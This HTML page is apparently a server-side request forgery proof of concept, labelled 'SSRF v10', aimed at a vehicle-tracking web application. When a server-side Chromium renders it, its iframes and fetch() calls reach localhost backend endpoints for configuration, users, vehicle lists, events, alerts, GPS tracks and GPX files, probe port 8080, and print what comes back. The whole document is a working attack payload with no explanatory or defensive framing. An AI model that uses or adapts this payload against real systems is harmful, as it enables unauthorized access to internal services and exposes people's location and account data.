<!DOCTYPE html>
<html><head><title>R</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:6px/1.05 monospace;margin:1px}
.s{border:1px solid #000;margin:1px 0}
h3{font-size:7px;background:#ccc;padding:0 2px}
iframe{width:100%;border:0}
pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-break:break-all}
</style>
</head>
<body>
<b>SSRF v10 - CAT CAS Proof + Internal Data</b>

<!-- UA -->
<div class="s"><h3>Chromium Version</h3>
<pre id="ua">...</pre></div>

<!-- init.php from localhost - shows CAT CAS branding -->
<div class="s"><h3>INIT.PHP FROM LOCALHOST (CAT CAS config)</h3>
<iframe style="height:150px" src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe></div>

<!-- cmd=generate from localhost -->
<div class="s"><h3>CMD=GENERATE FROM LOCALHOST</h3>
<iframe style="height:400px" src="https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-01-02"></iframe></div>

<!-- GPX from localhost -->
<div class="s"><h3>GPX TRACK 50 FROM LOCALHOST</h3>
<iframe style="height:100px" src="https://127.0.0.1/ax/get_gpx_file.php?track_id=50&node=3"></iframe></div>

<!-- Login page (shows CAT CAS logo) -->
<div class="s"><h3>LOGIN PAGE FROM LOCALHOST (CAT branding)</h3>
<iframe style="height:250px" src="https://127.0.0.1/"></iframe></div>

<!-- JS FETCH RESULTS -->
<div class="s"><h3>FETCH RESULTS (internal endpoints)</h3>
<pre id="r">scanning...</pre></div>

<script>
document.getElementById('ua').textContent = navigator.userAgent;

var o='';
function p(s){o+=s+'\n';document.getElementById('r').textContent=o}

async function tf(l,u){
try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,500))}
catch(e){p(l+' ERR: '+e.message)}
}

(async function(){
// Access init.php via HTTP fetch (mixed content might work like port 8080)
await tf('HTTP-init','http://127.0.0.1/backend/ax/init.php?node=3');
await tf('HTTP-tree','http://127.0.0.1/ax/tree.php?node=3');
await tf('HTTP-vehlist','http://127.0.0.1/ax/veh/list.php?node=3');
await tf('HTTP-user','http://127.0.0.1/backend/ax/user.php?node=3');
await tf('HTTP-events','http://127.0.0.1/backend/ax/events.php?node=3');
await tf('HTTP-alerts','http://127.0.0.1/backend/ax/alerts.php?node=3');
await tf('HTTP-tracks','http://127.0.0.1/ax/tracks_get.php?node=3');
await tf('HTTP-gpx','http://127.0.0.1/ax/get_gpx_file.php?track_id=50&node=3');
// Port 8080
await tf('8080:/','http://127.0.0.1:8080/');
p('DONE');
})();
</script>
</body></html>
